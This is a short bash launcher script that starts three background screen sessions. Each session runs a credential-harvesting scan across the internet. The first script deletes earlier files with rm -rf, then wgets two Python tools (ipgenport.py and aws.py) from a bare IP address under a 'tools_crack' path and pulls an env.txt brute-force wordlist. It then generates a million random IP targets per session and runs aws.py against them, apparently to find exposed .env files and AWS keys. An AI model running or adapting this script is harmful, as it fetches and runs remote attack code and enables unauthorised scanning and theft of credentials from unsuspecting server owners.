#!/bin/bash
# Rahim AR

rm -rf 1.sh 2.sh 3.sh && echo 'rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py && rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py env.txt && wget http://20.46.227.36/tools_crack/ipgenport.py && wget http://20.46.227.36/tools_crack/aws.py && wget https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/env.txt && python3 ipgenport.py 1 1000000 && python3 aws.py -l 1 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 1.sh
chmod +x 1.sh
screen -dmS sesi_1 ./1.sh
echo "DONE AUTO RUN SESSION 1"
sleep 2

echo 'python3 ipgenport.py 2 1000000 && python3 aws.py -l 2 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 2.sh
chmod +x 2.sh
screen -dmS sesi_2 ./2.sh
echo "DONE AUTO RUN SESSION 2"
sleep 2

echo 'python3 ipgenport.py 3 1000000 && python3 aws.py -l 3 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 3.sh
chmod +x 3.sh
screen -dmS sesi_3 ./3.sh
echo "DONE AUTO RUN SESSION 3"
sleep 2
